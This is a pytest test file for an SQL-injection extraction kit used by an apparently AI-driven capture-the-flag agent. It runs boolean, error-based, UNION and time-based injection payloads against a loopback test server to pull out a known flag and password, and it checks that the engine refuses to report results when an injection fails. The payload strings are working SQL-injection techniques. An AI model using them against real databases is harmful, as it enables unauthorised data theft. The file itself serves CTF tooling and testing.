"""The injection kit: the engine must work, and it must refuse to lie.

Two kinds of test here, and they exist for different reasons.

**Correctness** — the four oracle classes extract a known value from a real
(in-process) HTTP target. This is the only place in the suite where an actual
SQL injection is performed, and it is performed against ``kit.local_target``,
which is bound to 127.0.0.1 and never reaches a network.

**Refusal** — a spec whose predicate never reaches the query must raise, not
return an empty string. That is the regression this package exists to prevent:
every one of the four duplicated oracles in run 19 would have returned ``""``
for a dead target and let the worker report "no injection here".
"""

from __future__ import annotations

import pytest

from ctfagent.kit import (
    BoolOracle,
    ErrorOracle,
    Extractor,
    OracleError,
    Session,
    TimeOracle,
    UnionOracle,
)
from ctfagent.kit.local_target import FLAG, SECRET, start


@pytest.fixture(scope="module")
def target():
    server = start()
    yield server
    server._server.shutdown()
    server._server.server_close()


@pytest.fixture()
def session(target):
    return Session(target.base, timeout=10, retries=1)


# -- the engine works ---------------------------------------------------------
def test_bool_oracle_extracts_the_known_flag(session):
    def probe(cond):
        r = session.get("/check", {"id": f"1' AND ({cond}) AND '1'='1"})
        return None if not r.status else '"exists": true' in r.text

    oracle = BoolOracle(probe).calibrate()
    assert Extractor(oracle, max_length=64).read("SELECT flag FROM secrets LIMIT 1") == FLAG


def test_error_oracle_extracts_the_known_flag(session):
    def probe(cond):
        r = session.get(
            "/err",
            {"id": f"1' AND abs(CASE WHEN ({cond}) THEN -9223372036854775808 ELSE 1 END)--"},
        )
        return r.text if r.status else None

    oracle = ErrorOracle(probe, pattern="integer overflow").calibrate()
    assert Extractor(oracle, max_length=64).read("SELECT flag FROM secrets LIMIT 1") == FLAG


def test_union_oracle_reads_a_whole_value_in_one_request(session):
    # Bracketed with a marker rather than "take the last <li>": sqlite decides
    # the order of UNION rows, and measured here the injected row sorts first
    # for one expression and last for another. A real spec has to do the same.
    left, right = "SQ", "LI"

    def probe(expr):
        r = session.get("/search", {"q": f"1' UNION SELECT 1,'{left}'||{expr}||'{right}'--"})
        if not r.status:
            return None
        for item in r.text.split("<li>")[1:]:
            value = item.split("</li>")[0]
            if value.startswith(left) and value.endswith(right):
                return value[len(left) : -len(right)]
        return ""

    oracle = UnionOracle(probe).calibrate()
    # One request for the whole value, versus ~7 per character for the blind
    # oracles: this is why STRATEGY puts UNION ahead of them.
    assert oracle.extract("(SELECT flag FROM secrets LIMIT 1)") == FLAG
    assert oracle.extract("(SELECT pass FROM users WHERE id=1)") == SECRET


def test_time_oracle_extracts_a_short_prefix(session):
    burn = (
        "(SELECT count(*) FROM (WITH RECURSIVE c(x) AS "
        "(SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x<3000000) SELECT x FROM c))"
    )

    def probe(cond):
        r = session.get(
            "/timing",
            {"id": f"1' AND CASE WHEN ({cond}) THEN {burn} ELSE 0 END AND '1'='1"},
        )
        return r.elapsed if r.status else None

    oracle = TimeOracle(probe, delay=0.35, samples=1, retries=1).calibrate()
    # Two characters: this proves the threshold and the bisection, not the burn.
    assert Extractor(oracle, max_length=2).read("SELECT SUBSTR(flag,1,2) FROM secrets LIMIT 1") == FLAG[:2]


# -- the engine refuses to lie ------------------------------------------------
def test_bool_oracle_refuses_when_the_predicate_never_reaches_the_query(session):
    def probe(cond):
        # The payload is thrown away: `id=1` always answers TRUE.
        r = session.get("/check", {"id": "1"})
        return '"exists": true' in r.text

    with pytest.raises(OracleError):
        BoolOracle(probe).calibrate()


def test_extractor_refuses_an_uncalibrated_oracle(session):
    def probe(cond):
        return True

    with pytest.raises(OracleError):
        Extractor(BoolOracle(probe))


def test_time_oracle_refuses_when_the_sleep_never_fires(session):
    def probe(cond):
        r = session.get("/check", {"id": f"1' AND ({cond}) AND '1'='1"})
        return r.elapsed

    with pytest.raises(OracleError):
        TimeOracle(probe, delay=1.0, samples=1).calibrate()


def test_error_oracle_refuses_a_pattern_that_never_fires(session):
    def probe(cond):
        return session.get("/check", {"id": f"1' AND ({cond}) AND '1'='1"}).text

    with pytest.raises(OracleError):
        ErrorOracle(probe, pattern="ORA-01756").calibrate()


# -- transport ----------------------------------------------------------------
def test_session_isolates_the_operator_proxy_by_default(target):
    """The bug this prevents: 502 from 127.0.0.1:7897 read as "target down"."""
    s = Session(target.base, timeout=5)
    # An empty ProxyHandler means neither env vars nor platform settings apply.
    # Reaching a loopback target through the operator proxy would 502.
    assert s.get("/check", {"id": "1"}).status == 200


def test_reply_text_falls_back_to_gbk():
    from ctfagent.kit.http import Reply

    body = "flag{中文}".encode("gbk")
    reply = Reply(200, body, {"content-type": "text/html"}, 0.01, "http://x")
    assert reply.text == "flag{中文}"


# -- prompt wiring ------------------------------------------------------------
def test_web_workers_are_told_the_kit_exists():
    """Without this line the engine exists and nobody imports it.

    The block is what turns "there is a module" into "use it instead of typing
    the loop" — run 19 wrote four copies of one oracle while nothing in the
    prompt mentioned a shared one, because there was no shared one.
    """
    from ctfagent import prompts

    web = prompts.worker_system_prompt("web", "ctf-web", "c", "", "env")
    assert "ctfagent.kit" in web
    assert "calibrate()" in web

    # A misc challenge that turned out to be a web app is dispatched to a misc
    # worker; the category is what decides, not the role.
    misc_as_web = prompts.worker_system_prompt("misc", "ctf-misc", "c", "", "env", category="web")
    assert "ctfagent.kit" in misc_as_web

    crypto = prompts.worker_system_prompt("crypto", "ctf-crypto", "c", "", "env")
    assert "ctfagent.kit" not in crypto


def test_web_verifier_keeps_independence_but_not_the_boilerplate():
    """The verifier may import the engine; it may not import the claimant."""
    from ctfagent import prompts

    web = prompts.verifier_prompt("c", "", category="web")
    assert "ctfagent.kit" in web
    assert "自己写的" in web  # the probe must be its own
    # A non-web challenge gets the independence paragraph but no kit block.
    other = prompts.verifier_prompt("c", "")
    assert "独立复现" in other
    assert "注入工具包" not in other


def test_every_shipped_template_is_valid_python_against_the_control():
    """A template is documentation until it runs; these are meant to be copied.

    Two of the five are executable end to end here (bool, error); the other
    three are checked for syntax plus the one thing a copy is most likely to
    get wrong — the UNION row order.
    """
    import ast

    from ctfagent.kit.templates import TEMPLATES

    for name, body in TEMPLATES.items():
        ast.parse(body)  # SyntaxError here means a copied spec starts broken

    # The two that can run against the control unmodified apart from the URL
    # and table name. Their output is captured rather than read from a variable
    # because the templates differ (one assigns `flag`, one prints it) — what
    # matters is that the known value comes out.
    import io
    from contextlib import redirect_stdout

    for name in ("bool", "error"):
        server = start()
        try:
            src = (
                TEMPLATES[name]
                .replace("http://TARGET:PORT", server.base)
                .replace("SELECT flag FROM flag", "SELECT flag FROM secrets")
            )
            out = io.StringIO()
            with redirect_stdout(out):
                exec(compile(src, name, "exec"), {})  # noqa: S102 - our own string
            assert FLAG in out.getvalue(), f"{name} template did not print the flag"
        finally:
            server._server.shutdown()
            server._server.server_close()
